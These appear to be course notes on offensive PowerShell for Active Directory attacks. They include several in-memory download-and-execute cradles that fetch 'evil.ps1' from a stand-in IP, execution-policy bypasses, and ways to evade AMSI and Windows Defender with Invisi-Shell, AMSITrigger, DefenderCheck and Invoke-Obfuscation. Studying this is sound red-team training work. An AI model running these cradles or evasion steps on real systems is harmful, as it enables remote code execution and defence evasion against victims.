- Provides access to almost everything in a Windows platform and Active Directory Environment which could be useful for an attacker.
- Provides the capability of running powerful scripts completely from memory making it ideal for foothold shells/boxes.
- Based on .NET framework and is tightly integrated with Windows.
- PowerShell is NOT powershell.exe. It is the System.Management.Automation.dll
- We will use Windows PowerShell. There is a platform independent PowerShell Core as well.

# Scripts and modules

• Load a PowerShell script using dot sourcing:
```powershell
. C:\AD\Tools\PowerView.ps1
```

- A module (or a script) can be imported with:
```powershell
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

- All the commands in a module can be listed with:
```powershell
Get-Command -Module <modulename>
```

# Script execution

- Directly from http server:
```powershell
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')
```

```powershell
iex (iwr 'http://192.168.230.1/evil.ps1')
```
> Only from *PSv3* towards.

```powershell
$h=New-Object -ComObject Msxml2.XMLHTTP;
$h.open('GET','http://192.168.230.1/evil.ps1',$false);
$h.send();
iex $h.responseText
```

```powershell
$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
$r = $wr.GetResponse()
iex ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

- Using Internet Explorer:
```powershell
$ie=New-Object -ComObject InternetExplorer.Application;
$ie.visible=$False;
$ie.navigate('http://192.168.230.1/evil.ps1');
sleep 5;
$response=$ie.Document.body.innerHTML;
$ie.quit();
iex $response
```

# Execution policy

```powershell
powershell -ep bypass
```

It is NOT a security measure, it is present to prevent user from accidently executing scripts.

Several ways to bypass:
```powershell
powershell -ExecutionPolicy bypass
powershell -c <cmd>
powershell -encodedcommand
$env:PSExecutionPolicyPreference="bypass"
```

# Bypassing PowerShell Security

We will use [[Invisi-Shell]] (https://github.com/OmerYa/Invisi-Shell) for bypassing the security controls in PowerShell.

# Bypassing Anti Virus Signatures for PowerShell

We can always load scripts in memory and avoid detection using AMSI bypass. How do we bypass signature based detection of on-disk PowerShell scripts by Windows Defender?

- We can use the *AMSITrigger* (https://github.com/RythmStick/AMSITrigger) tool to identify the exact part of a script that is detected.
- We can use *DefenderCheck* (https://github.com/t3hbb/DefenderCheck) to identify code and strings from a binary / file that Windows Defender may flag.

Simply provide path to the script file to scan it:
```powershell
AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1
DefenderCheck.exe PowerUp.ps1
```

For full obfuscation of PowerShell scripts, see Invoke-Obfuscation (https://github.com/danielbohannon/Invoke-Obfuscation). That is used for obfuscating the AMSI bypass in the course!